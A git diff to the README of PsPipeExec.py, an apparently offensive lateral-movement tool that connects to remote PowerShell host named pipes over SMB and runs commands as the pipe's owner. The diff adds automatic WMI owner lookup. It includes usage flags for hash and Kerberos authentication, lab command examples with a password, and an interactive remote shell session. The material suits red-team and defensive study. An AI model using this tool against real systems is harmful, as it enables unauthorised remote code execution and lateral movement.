@@ -16,9 +16,9 @@ python3 -m pip install -r requirements
 ## Usage
 
 ```
-usage: PsPipeExec.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-port [destination port]] [--list] [--pipe PIPE] [--command COMMAND] [--script SCRIPT] target
+usage: PsPipeExec.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-port [destination port]] [--list] [--pipe PIPE] [--command COMMAND] [--script SCRIPT] [--no-wmi] target
 
-PowerShell Pipe Jacker
+PowerShell Named Pipe Lateral Movement Tool
 
 positional arguments:
   target                [[domain/]username[:password]@]<targetName or address>
@@ -36,8 +36,6 @@ authentication:
 
 connection:
   -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
-  -target-ip ip address
-                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
   -port [destination port]
                         Destination port to connect to SMB Server
 
@@ -46,17 +44,19 @@ PowerShell Pipes:
   --pipe PIPE           full pipe name under IPC$ to connect to
   --command COMMAND     run one command and exit (non-interactive)
   --script SCRIPT       run entire PS1 file
+  --no-wmi              skip WMI owner lookup for pipes
 
 ```
 
 ## Examples
 
 ### List Remote PSHost Pipes (Credentials)
+Pipe owners are resolved automatically via WMI. Use `--no-wmi` to skip the lookup.
 ```
 $ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --list
 
 PSHost pipes on target:
-   PSHost.134296493751823186.13108.DefaultAppDomain.powershell
+   PSHost.134296493751823186.13108.DefaultAppDomain.powershell  (LAB\administrator)
 ```
 
 ### List Remote PSHost Pipes (Kerberos)
@@ -64,13 +64,23 @@ PSHost pipes on target:
 $ python3 PsPipeExec.py -k -no-pass ws01.lab.local --list      
   
 PSHost pipes on target:
+   PSHost.134296493751823186.13108.DefaultAppDomain.powershell  (LAB\administrator)
+```
+
+### List Remote PSHost Pipes (No WMI)
+```
+$ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --list --no-wmi
+
+PSHost pipes on target:
    PSHost.134296493751823186.13108.DefaultAppDomain.powershell
 ```
 
 ### Connect to Remote PSHost Pipe (Credentials)
+The pipe owner is shown before connecting. Use `--no-wmi` to skip.
 ```
 $ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --command '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'
 
+[*] Pipe owner: LAB\administrator
 LAB\administrator
 
 ```
@@ -79,6 +89,7 @@ LAB\administrator
 ```
 $ python3 PsPipeExec.py -k -no-pass ws01.lab.local --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --command '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'
 
+[*] Pipe owner: LAB\administrator
 LAB\administrator
 
 ```
@@ -87,6 +98,7 @@ LAB\administrator
 ```
 $ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell   
 
+[*] Pipe owner: LAB\administrator
 Connected. Enter PowerShell commands; 'exit' to quit.
 PS> whoami
 lab\administrator
@@ -124,25 +136,13 @@ Ethernet adapter Ethernet0:
 
 
 ```
-### Find Which User Owns the PowerShell Pipe Without Command Execution (WMIQUERY)
+### Pipe Owner Resolution (WMI)
 
-No need to run whoami, or whatever PowerShell command to see who the PowerShell pipe belongs to. We can check with wmiquery.py form impacket. Wmi Query Language is massivly unerappreciated.
-
-Here are the commands you need to run a with a screenshot example:
-```
-## Replace 13108 with PID from PSHost Pipe
-# Example: PSHost.134296493751823186.13108.DefaultAppDomain.powershell
-
-WQL> ASSOCIATORS OF {Win32_Process.Handle="13108"} WHERE AssocClass=Win32_SessionProcess
-
-WQL> SELECT * FROM Win32_LoggedOnUser
+Pipe owners are resolved automatically using WMI Query Language (WQL) over DCOM. The tool extracts the PID from the pipe name (e.g. `13108` from `PSHost.134296493751823186.13108.DefaultAppDomain.powershell`) and runs two WQL queries under the hood:
 
 ```
+ASSOCIATORS OF {Win32_Process.Handle="13108"} WHERE AssocClass=Win32_SessionProcess
+ASSOCIATORS OF {Win32_LogonSession.LogonId="<LogonId>"} WHERE AssocClass=Win32_LoggedOnUser
+```
 
-![Alt text](media/wmiquery.png)
-
-## ToDo
-
-- [ ] Allow execution of whole PowerShell file
-- [ ] Interactive PowerShell console
-- [ ] Find better way to determine who the PSHost pipe belongs to
+This traces the process to its logon session, then to the user account — no command execution required. The lookup uses the same credentials as the SMB connection. If WMI access is restricted, the tool prints a warning and continues without owner info. Pass `--no-wmi` to skip the lookup entirely.
